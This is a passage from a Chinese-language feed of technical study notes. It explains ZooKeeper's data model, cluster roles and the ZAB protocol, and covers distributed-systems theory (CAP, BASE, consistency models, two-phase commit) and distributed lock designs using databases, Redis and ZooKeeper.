<p><strong>在为客户端创建会话之前，服务端首先会为每个客户端都分配一个sessionID。由于 sessionID 是 Zookeeper 会话的一个重要标识，许多与会话相关的运行机制都是基于这个 sessionID 的，因此，无论是哪台服务器为客户端分配的 sessionID，都务必保证全局唯一。</strong></p>
<h2 id="znode" tabindex="-1"> Znode</h2>
<p><strong>在谈到分布式的时候，我们通常说的“节点&quot;是指组成集群的每一台机器。然而，在Zookeeper中，“节点&quot;分为两类，第一类同样是指构成集群的机器，我们称之为机器节点；第二类则是指数据模型中的数据单元，我们称之为数据节点一一ZNode。</strong></p>
<p>Zookeeper将所有数据存储在内存中，数据模型是一棵树（Znode Tree)，由斜杠（/）的进行分割的路径，就是一个Znode，例如/foo/path1。每个上都会保存自己的数据内容，同时还会保存一系列属性信息。</p>
<p><strong>在Zookeeper中，node可以分为持久节点和临时节点两类。所谓持久节点是指一旦这个ZNode被创建了，除非主动进行ZNode的移除操作，否则这个ZNode将一直保存在Zookeeper上。而临时节点就不一样了，它的生命周期和客户端会话绑定，一旦客户端会话失效，那么这个客户端创建的所有临时节点都会被移除。</strong> 另外，ZooKeeper还允许用户为每个节点添加一个特殊的属性：<strong>SEQUENTIAL</strong>.一旦节点被标记上这个属性，那么在这个节点被创建的时候，Zookeeper会自动在其节点名后面追加上一个整型数字，这个整型数字是一个由父节点维护的自增数字。</p>
<h2 id="版本" tabindex="-1"> 版本</h2>
<p>在前面我们已经提到，Zookeeper 的每个 ZNode 上都会存储数据，对应于每个ZNode，Zookeeper 都会为其维护一个叫作 <strong>Stat</strong> 的数据结构，Stat 中记录了这个 ZNode 的三个数据版本，分别是version（当前ZNode的版本）、cversion（当前ZNode子节点的版本）和 aversion（当前ZNode的ACL版本）。</p>
<h2 id="watcher" tabindex="-1"> Watcher</h2>
<p><strong>Watcher（事件监听器），是Zookeeper中的一个很重要的特性。Zookeeper允许用户在指定节点上注册一些Watcher，并且在一些特定事件触发的时候，ZooKeeper服务端会将事件通知到感兴趣的客户端上去，该机制是Zookeeper实现分布式协调服务的重要特性。</strong></p>
<h2 id="acl" tabindex="-1"> ACL</h2>
<p>Zookeeper采用ACL（AccessControlLists）策略来进行权限控制，类似于 UNIX 文件系统的权限控制。Zookeeper 定义了如下5种权限。</p>
<ul>
<li>CREATE：创建子节点的权限</li>
<li>READ：获取节点数据和子节点列表的权限</li>
<li>WRITE：更新节点数据的权限</li>
<li>DELETE：删除子节点的权限</li>
<li>ADMIN：设置节点ACL的权限</li>
</ul>
<p>其中尤其需要注意的是，CREATE和DELETE这两种权限都是针对子节点的权限控制。</p>
<h1 id="zookeeper-特点" tabindex="-1"> ZooKeeper 特点</h1>
<ul>
<li><strong>顺序一致性：</strong> 从同一客户端发起的事务请求，最终将会严格地按照顺序被应用到 ZooKeeper 中去。</li>
<li><strong>原子性：</strong> 所有事务请求的处理结果在整个集群中所有机器上的应用情况是一致的，也就是说，要么整个集群中所有的机器都成功应用了某一个事务，要么都没有应用。</li>
<li><strong>单一系统映像 ：</strong> 无论客户端连到哪一个 ZooKeeper 服务器上，其看到的服务端数据模型都是一致的。</li>
<li><strong>可靠性：</strong> 一旦一次更改请求被应用，更改的结果就会被持久化，直到被下一次更改覆盖。</li>
</ul>
<h1 id="zookeeper-设计目标" tabindex="-1"> ZooKeeper 设计目标</h1>
<h2 id="简单的数据模型" tabindex="-1"> 简单的数据模型</h2>
<p>ZooKeeper 允许分布式进程通过共享的层次结构命名空间进行相互协调，这与标准文件系统类似。 名称空间由 ZooKeeper 中的数据寄存器组成 - 称为znode，这些类似于文件和目录。 与为存储设计的典型文件系统不同，ZooKeeper数据保存在内存中，这意味着ZooKeeper可以实现高吞吐量和低延迟。</p>
<p><img src="@source/assets/cs-note/framework/zookeeper/ZooKeeper数据模型.png" alt="ZooKeeper数据模型" loading="lazy"></p>
<h2 id="可构建集群" tabindex="-1"> 可构建集群</h2>
<p><strong>为了保证高可用，最好是以集群形态来部署 ZooKeeper，这样只要集群中大部分机器是可用的（能够容忍一定的机器故障），那么zookeeper本身仍然是可用的。</strong> 客户端在使用 ZooKeeper 时，需要知道集群机器列表，通过与集群中的某一台机器建立 TCP 连接来使用服务，客户端使用这个TCP链接来发送请求、获取结果、获取监听事件以及发送心跳包。如果这个连接异常断开了，客户端可以连接到另外的机器上。</p>
<p><strong>ZooKeeper 官方提供的架构图：</strong></p>
<p><img src="@source/assets/cs-note/framework/zookeeper/ZooKeeper架构.png" alt="ZooKeeper架构" loading="lazy"></p>
<p>上图中每一个Server代表一个安装Zookeeper服务的服务器。组成 ZooKeeper 服务的服务器都会在内存中维护当前的服务器状态，并且每台服务器之间都互相保持着通信。集群间通过 Zab 协议（Zookeeper Atomic Broadcast）来保持数据的一致性。</p>
<h2 id="顺序访问" tabindex="-1"> 顺序访问</h2>
<p><strong>对于来自客户端的每个更新请求，ZooKeeper 都会分配一个全局唯一的递增编号，这个编号反应了所有事务操作的先后顺序，应用程序可以使用 ZooKeeper 这个特性来实现更高层次的同步原语。</strong> <strong>这个编号也叫做时间戳——zxid（Zookeeper Transaction Id）</strong></p>
<h2 id="高性能" tabindex="-1"> 高性能</h2>
<p><strong>ZooKeeper 是高性能的。 在“读”多于“写”的应用程序中尤其地高性能，因为“写”会导致所有的服务器间同步状态。（“读”多于“写”是协调服务的典型场景。）</strong></p>
<h1 id="zookeeper-集群角色介绍" tabindex="-1"> ZooKeeper 集群角色介绍</h1>
<p><strong>最典型集群模式： Master/Slave 模式（主备模式）</strong>。在这种模式中，通常 Master服务器作为主服务器提供写服务，其他的 Slave 服务器从服务器通过异步复制的方式获取 Master 服务器最新的数据提供读服务。</p>
<p>但是，<strong>在 ZooKeeper 中没有选择传统的  Master/Slave 概念，而是引入了Leader、Follower 和 Observer 三种角色</strong>。如下图所示</p>
<p><img src="@source/assets/cs-note/framework/zookeeper/ZooKeeper集群角色.png" alt="" loading="lazy"></p>
<p><strong>ZooKeeper 集群中的所有机器通过一个 Leader 选举过程来选定一台称为 “Leader” 的机器，Leader 既可以为客户端提供写服务又能提供读服务。除了 Leader 外，Follower 和  Observer 都只能提供读服务。Follower 和  Observer 唯一的区别在于 Observer 机器不参与 Leader 的选举过程，也不参与写操作的“过半写成功”策略，因此 Observer 机器可以在不影响写性能的情况下提升集群的读性能。</strong></p>
<div>
<table>
  	<tr>
		<td colspan="2">角色</td>
		<td>主要工作描述</td>
	</tr>
    <tr>
		<td colspan="2">领导者(Leader)</td>
		<td>
        1. 事务请求的唯一调度和处理者，保证集群事务处理的顺序性
        2. 集群内部个服务器的调度者</td>
	</tr>
    <tr>
		<td rowspan="2">学习者(Learner)</td>
        <td>跟随者(Follower)</td>
		<td>
        1. 处理客户端非事务请求，转发事务请求给Leader服务器
        2. 参与事务请求Proposal的投票
        3. 参与Leader选举的投票</td>
	</tr>
    <tr>
        <td>观察者(Observer)</td>
		<td>Follower和Observer唯一的区别在于Observer机器不参与Leader的选举，也不参与写操作的"过半写成功"策略，
        因此Observer机器可以不影响写性能的情况下提升集群的读性能</td>
	</tr>
    <tr>
		<td colspan="2">客户端(Client)</td>
		<td>请求发起方</td>
	</tr>
</table>
</div>
<p><strong>当 Leader 服务器出现网络中断、崩溃退出与重启等异常情况时，ZAB 协议就会进人恢复模式并选举产生新的Leader服务器。这个过程大致是这样的：</strong></p>
<ol>
<li>Leader election（选举阶段）：节点在一开始都处于选举阶段，只要有一个节点得到超半数节点的票数，它就可以当选准 leader。</li>
<li>Discovery（发现阶段）：在这个阶段，followers 跟准 leader 进行通信，同步 followers 最近接收的事务提议。</li>
<li>Synchronization（同步阶段）:同步阶段主要是利用 leader 前一阶段获得的最新提议历史，同步集群中所有的副本。同步完成之后
准 leader 才会成为真正的 leader。</li>
<li>Broadcast（广播阶段）
到了这个阶段，Zookeeper 集群才能正式对外提供事务服务，并且 leader 可以进行消息广播。同时如果有新的节点加入，还需要对新节点进行同步。</li>
</ol>
<h1 id="zookeeper-zab协议-paxos算法" tabindex="-1"> ZooKeeper &amp; ZAB协议 &amp; Paxos算法</h1>
<h2 id="zab协议-paxos算法" tabindex="-1"> ZAB协议 &amp; Paxos算法</h2>
<p>Paxos 算法应该可以说是  ZooKeeper 的灵魂了。但是，ZooKeeper 并没有完全采用 Paxos算法 ，而是使用 ZAB 协议作为其保证数据一致性的核心算法。另外，在ZooKeeper的官方文档中也指出，ZAB协议并不像 Paxos 算法那样，是一种通用的分布式一致性算法，它是一种特别为Zookeeper设计的崩溃可恢复的原子消息广播算法。</p>
<h2 id="zab-协议介绍" tabindex="-1"> ZAB 协议介绍</h2>
<p><strong>ZAB（ZooKeeper Atomic Broadcast 原子广播） 协议是为分布式协调服务 ZooKeeper 专门设计的一种支持崩溃恢复的原子广播协议。 在 ZooKeeper 中，主要依赖 ZAB 协议来实现分布式数据一致性，基于该协议，ZooKeeper 实现了一种主备模式的系统架构来保持集群中各个副本之间的数据一致性。</strong></p>
<h2 id="zab-协议两种基本的模式-崩溃恢复和消息广播" tabindex="-1"> ZAB 协议两种基本的模式：崩溃恢复和消息广播</h2>
<p>ZAB协议包括两种基本的模式，分别是 <strong>崩溃恢复和消息广播</strong>。当整个服务框架在启动过程中，或是当 Leader 服务器出现网络中断、崩溃退出与重启等异常情况时，ZAB 协议就会进人恢复模式并选举产生新的Leader服务器。当选举产生了新的 Leader 服务器，同时集群中已经有过半的机器与该Leader服务器完成了状态同步之后，ZAB协议就会退出恢复模式。其中，<strong>所谓的状态同步是指数据同步，用来保证集群中存在过半的机器能够和Leader服务器的数据状态保持一致</strong>。</p>
<p><strong>当集群中已经有过半的Follower服务器完成了和Leader服务器的状态同步，那么整个服务框架就可以进人消息广播模式了。</strong> 当一台同样遵守ZAB协议的服务器启动后加人到集群中时，如果此时集群中已经存在一个Leader服务器在负责进行消息广播，那么新加人的服务器就会自觉地进人数据恢复模式：找到Leader所在的服务器，并与其进行数据同步，然后一起参与到消息广播流程中去。正如上文介绍中所说的，ZooKeeper设计成只允许唯一的一个Leader服务器来进行事务请求的处理。Leader服务器在接收到客户端的事务请求后，会生成对应的事务提案并发起一轮广播协议；而如果集群中的其他机器接收到客户端的事务请求，那么这些非Leader服务器会首先将这个事务请求转发给Leader服务器。</p>
<p>关于 <strong>ZAB 协议&amp;Paxos算法</strong> 需要讲和理解的东西太多了。推荐阅读下面两篇文章：</p>
<ul>
<li><a href="http://codemacro.com/2014/10/15/explain-poxos/" target="_blank" rel="noopener noreferrer">图解 Paxos 一致性协议</a></li>
<li><a href="https://dbaplus.cn/news-141-1875-1.html" target="_blank" rel="noopener noreferrer">Zookeeper ZAB 协议分析</a></li>
</ul>
<p>关于如何使用 zookeeper 实现分布式锁，可以查看下面这篇文章：</p>
<ul>
<li></li>
</ul>
<p><a href="https://blog.csdn.net/qiangcuo6087/article/details/79067136" target="_blank" rel="noopener noreferrer">10分钟看懂！基于Zookeeper的分布式锁</a></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">算法</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%AE%97%E6%B3%95/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%AE%97%E6%B3%95/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">系统设计</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">分布式系统设计理念</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%88%86%E5%B8%83%E5%BC%8F.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%88%86%E5%B8%83%E5%BC%8F.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>

<h1 id="分布式系统设计理念" tabindex="-1"> 分布式系统设计理念</h1>
<h2 id="中心化设计" tabindex="-1"> 中心化设计</h2>
<ul>
<li>两个角色： 中心化的设计思想很简单，分布式集群中的节点机器按照角色分工，大体上分为两种角色： “领导” 和 “干活的”</li>
<li>角色职责： “领导”通常负责分发任务并监督“干活的”，发现谁太闲了，就想发设法地给其安排新任务，确保没有一个“干活的”能够偷懒，如果“领导”发现某个“干活的”因为劳累过度而病倒了，则是不会考虑先尝试“医治”他的，而是一脚踢出去，然后把他的任务分给其他人。其中微服务架构 Kubernetes 就恰好采用了这一设计思路。</li>
</ul>
<p><strong>中心化设计的问题</strong>：</p>
<ul>
<li>中心化的设计存在的最大问题是“领导”的安危问题，如果“领导”出了问题，则群龙无首，整个集群就奔溃了。但我们难以同时安排两个“领导”以避免单点问题。</li>
<li>中心化设计还存在另外一个潜在的问题，既“领导”的能力问题：可以领导10个人高效工作并不意味着可以领导100个人高效工作，所以如果系统设计和实现得不好，问题就会卡在“领导”身上。</li>
</ul>
<p>领导安危问题的解决办法： 大多数中心化系统都采用了主备两个“领导”的设计方案，可以是热备或者冷备，也可以是自动切换或者手动切换，而且越来越多的新系统都开始具备自动选举切换“领导”的能力，以提升系统的可用性。</p>
<h2 id="去中心化设计" tabindex="-1"> 去中心化设计</h2>
<ul>
<li><strong>众生地位平等</strong>：在去中心化的设计里，通常没有“领导”和“干活的”这两种角色的区分，大家的角色都是一样的，地位是平等的，全球互联网就是一个典型的去中心化的分布式系统，联网的任意节点设备宕机，都只会影响很小范围的功能。</li>
<li><strong>“去中心化”不是不要中心，而是由节点来自由选择中心</strong>：（集群的成员会自发的举行“会议”选举新的“领导”主持工作。最典型的案例就是ZooKeeper及Go语言实现的Etcd）</li>
<li><strong>去中心化设计的问题</strong>：去中心化设计里最难解决的一个问题是 “脑裂”问题 ，这种情况的发声概率很低，但影响很大。脑裂问题，这种情况的发生概率很低，但影响很大。脑裂指一个集群由于网络的故障，被分为至少两个彼此无法通信的单独集群，此时如果两个集群都各自工作，则可能会产生严重的数据冲突和错误。一般的设计思路是，当集群判断发生了脑裂问题时，规模较小的集群就“自杀”或者拒绝服务。</li>
</ul>
<h2 id="分布式与集群对比" tabindex="-1"> 分布式与集群对比</h2>
<ul>
<li>分布式： 一个业务分拆多个子业务，部署在不同的服务器上</li>
<li>集群： 同一个业务，部署在多个服务器上。比如之前做电商网站搭的redis集群以及solr集群都是属于将redis服务器提供的缓存服务以及solr服务器提供的搜索服务部署在多个服务器上以提高系统性能、并发量解决海量存储问题。</li>
</ul>
<h1 id="分布式理论" tabindex="-1"> 分布式理论</h1>
<h2 id="cap" tabindex="-1"> CAP</h2>
<p>分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a14268b3-b937-4ffa-a34a-4cc53071686b.jpg" width="450px"> </div><br>
<h3 id="一致性" tabindex="-1"> 一致性</h3>
<p>一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。</p>
<p>对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。</p>
<h3 id="可用性" tabindex="-1"> 可用性</h3>
<p>可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。</p>
<p>在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。</p>
<h3 id="分区容忍性" tabindex="-1"> 分区容忍性</h3>
<p>网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。</p>
<p>在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。</p>
<h3 id="权衡" tabindex="-1"> 权衡</h3>
<p>在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。</p>
<p>可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时，</p>
<ul>
<li>为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用性；</li>
<li>为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致。</li>
</ul>
<h2 id="base" tabindex="-1"> BASE</h2>
<p>BASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。</p>
<p>BASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。</p>
<h3 id="基本可用" tabindex="-1"> 基本可用</h3>
<p>指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。</p>
<p>例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。</p>
<h3 id="软状态" tabindex="-1"> 软状态</h3>
<p>指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。</p>
<h3 id="最终一致性" tabindex="-1"> 最终一致性</h3>
<p>最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。</p>
<p>ACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。</p>
<p>在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。</p>
<h2 id="一致性模型" tabindex="-1"> 一致性模型</h2>
<p>分布式系统中一个重要的问题就是数据复制，数据复制一般是为了增强系统的可用性或提高性能。但是数据复制是要付出代价的。数据复制带来了多副本数据一致性的问题。</p>
<p>一致性模型本质上是进程与数据存储的约定，提供了分布式系统中数据复制时保持一致性的约束。</p>
<p>一个副本的数据更新之后，其他副本必须要保持同步，否则数据不一致就可能导致业务出现问题。因此，每次更新数据对所有副本进行修改的时间以及方式决定了复制代价的大小。全局同步与性能实际上是矛盾的，而为了提高性能，往往会采用放宽一致性要求的方法。因此，我们需要用一致性模型来理解和推理在分布式系统中数据复制需要考虑的问题和基本假设。</p>
<h3 id="强一致性" tabindex="-1"> 强一致性</h3>
<p>强一致性也称为原子一致性、线性一致性。强一致性可以理解为在任意时刻，所有节点中的数据是一样的。同一时间点，你在节点A中获取到key1的值与在节点B中获取到key1的值应该都是一样的。任何一次读都能读到某个数据的最近一次写的数据，系统中的所有进程，看到的操作顺序，都和全局时钟下的顺序一致。</p>
<h4 id="主从同步" tabindex="-1"> 主从同步</h4>
<p>基本思想：主从同步复制：</p>
<ul>
<li>Master 接受写请求</li>
<li>Master 复制日志至slave</li>
<li>Master 等待，直到所有从库返回</li>
</ul>
<p>存在的问题:一个节点失败，Master阻塞，导致整集群不可用，保证了一致性，可用性大大降低</p>
<p>相关协议：</p>
<ul>
<li>2PC</li>
<li>3PC</li>
</ul>
<h4 id="共识选举" tabindex="-1"> 共识选举</h4>
<p>基本思想：每次写都保证写入大于N/2个节点，每次读保证从大于N/2个节点中读。</p>
<p>相关协议：</p>
<ul>
<li>Paxos</li>
<li>Raft（multi-paxos）</li>
<li>ZAB（multi-paxos）</li>
</ul>
<h3 id="弱一致性" tabindex="-1"> 弱一致性</h3>
<p>弱一致性包含很多种不同的实现，目前分布式系统中广泛实现的是最终一致性。最终一致性是弱一致性的一种特例，随着时间的迁移，不同节点上的同一份数据总是在向趋同的方向变化，保证用户最终能够读取到某操作对系统特定数据的更新。也可以简单的理解为在一段时间后，节点间的数据会最终达到一致状态。</p>
<p>最终一致性根据更新数据后各进程访问到数据的时间和方式的不同，又可以区分为：</p>
<ol>
<li>因果一致性：如果进程A通知进程B它已更新了一个数据项，那么进程B的后续访问将返回更新后的值，且一次写入将保证取代前一次写入。与进程A无因果关系的进程C的访问遵守一般的最终一致性规则。</li>
<li>读己之所写一致性：当进程A自己更新一个数据项之后，它总是访问到更新过的值，绝不会看到旧值。这是因果一致性模型的一个特例。</li>
<li>会话一致性：这是上一个模型的实用版本，它把访问存储系统的进程放到会话的上下文中。只要会话还存在，系统就保证“读己之所写”一致性。如果由于某些失败情形令会话终止，就要建立新的会话，而且系统的保证不会延续到新的会话。</li>
<li>单调读一致性：如果进程已经看到过数据对象的某个值，那么任何后续访问都不会返回在那个值之前的值。</li>
<li>单调写一致性：系统保证来自同一个进程的写操作顺序执行。要是系统不能保证这种程度的一致性，就非常难以编程了。</li>
</ol>
<p>相关协议：Gossip（Cassandra、Redis的通信协议）</p>
<h2 id="一致性协议" tabindex="-1"> 一致性协议</h2>
<p>为了实现一致性模型的约束，需要通过一致性协议来保证。一致性协议根据是否允许数据分歧可以分为两种：</p>
<ul>
<li>单主协议（不允许数据分歧）：整个分布式系统就像一个单体系统，所有写操作都由主节点处理并且同步给其他副本。例如2PC、3PC、Paxos等</li>
<li>多主协议（允许数据分歧）：所有写操作可以由不同节点发起，并且同步给其他副本。例如 Gossip、POW。由于多主协议一般提供的都是最终一致性，所以常用在对数据一致性要求不高的场景中。</li>
</ul>
<h1 id="分布式事务" tabindex="-1"> 分布式事务</h1>
<p>分布式事务就是指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的分布式系统的不同节点之上。</p>
<p>指事务的操作位于不同的节点上，需要保证事务的 ACID 特性。</p>
<p>分布式事务就是为了保证不同数据库的数据一致性。</p>
<p>例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。</p>
<p><a href="https://www.jianshu.com/p/1156151e20c8" target="_blank" rel="noopener noreferrer">分布式服务化系统一致性的“最佳实干”</a></p>
<h2 id="分布式事务产生原因" tabindex="-1"> 分布式事务产生原因</h2>
<ul>
<li>数据库分库分表</li>
<li>应用SOA化</li>
</ul>
<h2 id="解决方案" tabindex="-1"> 解决方案</h2>
<h3 id="两阶段提交-2pc" tabindex="-1"> 两阶段提交（2PC）</h3>
<p>两阶段提交（Two-phase Commit，2PC），通过引入协调者（Coordinator）来协调参与者的行为，并最终决定这些参与者是否要真正执行事务。</p>
<h4 id="_1-运行过程" tabindex="-1"> 1. 运行过程</h4>
<h5>1.1 准备阶段</h5>
<p>协调者询问参与者事务是否执行成功，参与者发回事务执行结果。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/44d33643-1004-43a3-b99a-4d688a08d0a1.png" width="550px"> </div><br>
<h5>1.2 提交阶段</h5>
<p>如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。</p>
<p>需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d2ae9932-e2b1-4191-8ee9-e573f36d3895.png" width="550px"> </div><br>
<h4 id="_2-存在的问题" tabindex="-1"> 2. 存在的问题</h4>
<h5>2.1 同步阻塞</h5>
<p>所有事务参与者在等待其它参与者响应的时候都处于同步阻塞状态，无法进行其它操作。</p>
<h5>2.2 单点问题</h5>
<p>协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在阶段二发生故障，所有参与者会一直等待，无法完成其它操作。</p>
<h5>2.3 数据不一致</h5>
<p>在阶段二，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。</p>
<h5>2.4 太过保守</h5>
<p>任意一个节点失败就会导致整个事务失败，没有完善的容错机制。</p>
<h3 id="本地消息表-异步确保" tabindex="-1"> 本地消息表(异步确保)</h3>
<p>本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性，并且使用了消息队列来保证最终一致性。</p>
<ol>
<li>在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。</li>
<li>之后将本地消息表中的消息转发到消息队列中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。</li>
<li>在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。</li>
</ol>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/476329d4-e2ef-4f7b-8ac9-a52a6f784600.png" width="740px"> </div><br>
<h3 id="补偿事务-tcc" tabindex="-1"> 补偿事务(TCC)</h3>
<h3 id="mq-事务消息" tabindex="-1"> MQ 事务消息</h3>
<h1 id="分布式锁" tabindex="-1"> 分布式锁</h1>
<p>在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。</p>
<p>阻塞锁通常使用互斥量来实现：</p>
<ul>
<li>互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；</li>
<li>互斥量为 1 表示未锁定状态。</li>
</ul>
<p>1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。</p>
<h2 id="数据库的唯一索引" tabindex="-1"> 数据库的唯一索引</h2>
<p>获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否存于锁定状态。</p>
<p>存在以下几个问题：</p>
<ul>
<li>锁没有失效时间，解锁失败的话其它进程无法再获得该锁。</li>
<li>只能是非阻塞锁，插入失败直接就报错了，无法重试。</li>
<li>不可重入，已经获得锁的进程也必须重新获取锁。</li>
</ul>
<h2 id="redis-的-setnx-指令" tabindex="-1"> Redis 的 SETNX 指令</h2>
<p>使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。</p>
<p>SETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。</p>
<p>EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。</p>
<h2 id="redis-的-redlock-算法" tabindex="-1"> Redis 的 RedLock 算法</h2>
<p>使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。</p>
<ul>
<li>尝试从 N 个互相独立 Redis 实例获取锁；</li>
<li>计算获取锁消耗的时间，只有当这个时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，那么就认为锁获取成功了；</li>
<li>如果锁获取失败，就到每个实例上释放锁。</li>
</ul>
<h2 id="zookeeper-的有序节点" tabindex="-1"> Zookeeper 的有序节点</h2>
<h3 id="_1-zookeeper-抽象模型" tabindex="-1"> 1. Zookeeper 抽象模型</h3>
<p>Zookeeper 提供了一种树形结构的命名空间，/app1/p_1 节点的父节点为 /app1。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/aefa8042-15fa-4e8b-9f50-20b282a2c624.png" width="320px"> </div><br>
<h3 id="_2-节点类型" tabindex="-1"> 2. 节点类型</h3>
<ul>
<li>永久节点：不会因为会话结束或者超时而消失；</li>
<li>临时节点：如果会话结束或者超时就会消失；</li>
<li>有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，以此类推。</li>
</ul>
<h3 id="_3-监听器" tabindex="-1"> 3. 监听器</h3>
<p>为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。</p>
<h3 id="_4-分布式锁实现" tabindex="-1"> 4. 分布式锁实现</h3>
<ul>
<li>创建一个锁目录 /lock；</li>
<li>当一个客户端需要获取锁时，在 /lock 下创建临时的且有序的子节点；</li>
<li>客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁；</li>
<li>执行业务代码，完成后，删除对应的子节点。</li>
</ul>
